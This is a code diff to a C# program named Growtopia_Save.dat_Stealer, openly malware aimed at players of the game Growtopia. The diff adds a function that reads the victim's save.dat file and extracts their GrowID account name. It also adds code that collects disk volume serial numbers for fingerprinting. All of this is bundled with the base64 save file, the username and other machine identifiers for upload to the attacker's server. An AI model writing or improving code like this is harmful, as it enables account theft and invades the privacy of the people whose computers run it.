@@ -3,6 +3,7 @@ using System;
 using System.Collections.Specialized;
 using System.IO;
 using System.Linq;
+using System.Management;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Reflection;
@@ -29,8 +30,9 @@ namespace Growtopia_Save.dat_Stealer
 
                         NameValueCollection data = new NameValueCollection()
                         {
-                            { "code", "pakyubobo"},  // Code for upload attack protection?? Change "pakyubobo" HERE and ON PHP SERVER if want to.
+                            { "code", "pakyubobo"},  // Verification upload code. not your password.
                             { "user", Environment.UserName}, // Get user.
+                            { "gid", getGID() }, // GrowID. return null_gid if it is blank/empty.
                             { "data", getContent() } // Get pc info.
                         };
 
@@ -62,6 +64,51 @@ namespace Growtopia_Save.dat_Stealer
                 return true;
         }
 
+        public static string getGID()
+        {
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/Growtopia/save.dat";
+
+            if (File.Exists(path))
+            {
+                string data = "";
+
+                try
+                {
+                    using (FileStream stream = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                    {
+                        byte[] buf = new byte[1024];
+                        int c;
+
+                        while ((c = stream.Read(buf, 0, buf.Length)) > 0)
+                        {
+                            data += Encoding.ASCII.GetString(buf, 0, c);
+                        }
+                    }
+
+                    byte[] bytes = Encoding.ASCII.GetBytes(data);
+
+                    string gid = data.Substring(data.IndexOf("tankid_name") + 15, Convert.ToInt32(bytes[data.IndexOf("tankid_name") + 11]));
+
+                    if (string.IsNullOrEmpty(gid))
+                    {
+                        return "null_gid";
+                    }
+                    else
+                    {
+                        return gid;
+                    }
+                }
+                catch
+                {
+                    return "null_gid";
+                }
+            }
+            else
+            {
+                return "null_gid";
+            }
+        }
+
         static public string getContent()
         {
             string data = Convert.ToBase64String(File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/Growtopia/save.dat"));
@@ -72,6 +119,9 @@ namespace Growtopia_Save.dat_Stealer
 
             info += "\n<font color = \"lime\"><strong>OPERATIONAL NETWORK ADAPTERS:</strong></font>\n\n";
             info += getNetworkAdapters();
+
+            info += "\n<font color = \"lime\"><strong>DISKS VOLUME SERIAL:</strong></font>\n\n";
+            info += GetDisksVolumeSerial();
 
             info += "\n<font color = \"lime\"><strong>MACHINE GUID:</strong></font>\n\n";
             info += getMGUID();
@@ -114,6 +164,24 @@ namespace Growtopia_Save.dat_Stealer
             }
 
             return info;
+        }
+
+        public static string GetDisksVolumeSerial() // GET DISKS VOLUME SERIAL
+        {
+            string text = "";
+
+            ManagementClass mangnmt = new ManagementClass("Win32_LogicalDisk");
+            ManagementObjectCollection mcol = mangnmt.GetInstances();
+
+            foreach (ManagementObject strt in mcol)
+            {
+                if (Convert.ToString(strt["VolumeSerialNumber"]).Length == 8)
+                {
+                    text += "<font color = \"yellow\">Disk " + strt["DeviceID"] + " </font>" + Convert.ToString(strt["VolumeSerialNumber"] + "<br>");
+                }
+            }
+
+            return text;
         }
 
         public static string getMGUID()
